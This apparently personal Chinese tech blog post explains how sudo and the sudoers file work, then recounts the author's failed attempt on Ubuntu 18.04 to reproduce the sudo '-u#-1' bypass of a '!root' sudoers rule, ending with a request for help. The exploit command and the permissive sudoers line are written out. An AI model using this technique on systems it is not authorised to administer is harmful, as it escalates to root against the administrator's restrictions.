---
layout: post
title: 天呐，经常用的sudo居然有漏洞？
category: tech
tags: [sudo,root,漏洞,用户]
---

* content
{:toc}

这两天看到一个新闻让我很是震惊，linux上最常用的命令之一， sudo 命令居然被爆出有安全漏洞。作为一个程序员，可以说几乎天天和这个命令打交道，哪能想到这么成熟的命令工具居然隐藏着安全漏洞。


## sudo介绍
大部分开发运维对这个命令都非常熟悉，不过考虑到有效读者不了解我还是简单介绍下。

sudo 指“超级用户”。作为一个系统命令，其允许其它非 root 用户以特殊权限来运行程序或命令，而无需切换使用环境。举个例子：

我下面已一个普通用户在 /usr/local/ 目录下新建一个目录，直接运行会报没有权限的错误，
```
user1@user1:/usr/local$ mkdir test
mkdir: cannot create directory ‘test’: Permission denied
```

必须要这样才可以，
```
user1@user1:/usr/local$ sudo mkdir test
user1@user1:/usr/local$ ls
bin  etc  games  include  lib  man  sbin  share  src  test
```

一个普通用户要想使用sudo，必须有管理员(root)配置 sudoers 文件，对用户的权限进行定义。类似下面这样：

```
# User privilege specification
user2    ALL=(ALL:ALL) ALL
```

上述命令中：

* user2 表示用户名
* 第一个 ALL 指示允许从任何终端、机器访问 sudo
* 第二个 (ALL:ALL) 指示 sudo 命令被允许以任何用户身份执行，后面那个ALL是用户所在的群组
* 第三个 ALL 表示所有命令都可以作为 root 执行

如果没有加这个配置，执行的时候会报如下的错误：
```
user2@pony:/home$ sudo mkdir test2
[sudo] password for user2: 
user2 is not in the sudoers file.  This incident will be reported.
```

## 如何利用漏洞

我根据下面这篇文章，进行问题复现，

https://www.sudo.ws/alerts/minus_1_uid.html

我使用的linux版本是 Ubuntu 18.04.3 LTS 。

首先我配置用户 user2 的权限，

```xml
# User privilege specification
user2    ALL=(ALL,!root) /bin/bash
```

这个配置的意思是，user2用户可以用任何用户(除了root)执行 /bin/bash 命令。

然后我试着执行，

```
user2@pony:~$ sudo -u#-1 /bin/bash
sudo: unknown user: #-1
sudo: unable to initialize policy plugin
```
什么鬼，好像没有啥问题啊，直接报错了，并没有切换到 root 用户，再试着执行，

```bash
user2@pony:~$ sudo -u#-1 id -u
sudo: unknown user: #-1
sudo: unable to initialize policy plugin
```
也没有任何问题啊，那这个漏洞究竟该怎么复现呢？？

按照上面文章的说法，之所以会产生这个漏洞，是因为将用户 ID 转换为用户名的函数会将 -1（或无效等效的 4294967295）误认为是 0，而这正好是 root 的用户 ID 。

但是，我实际操作发现并复现到这个漏洞。感觉应该是我哪里配置的不对？


## 总结

我也不知道为啥我复现不了问题。请大神执教！
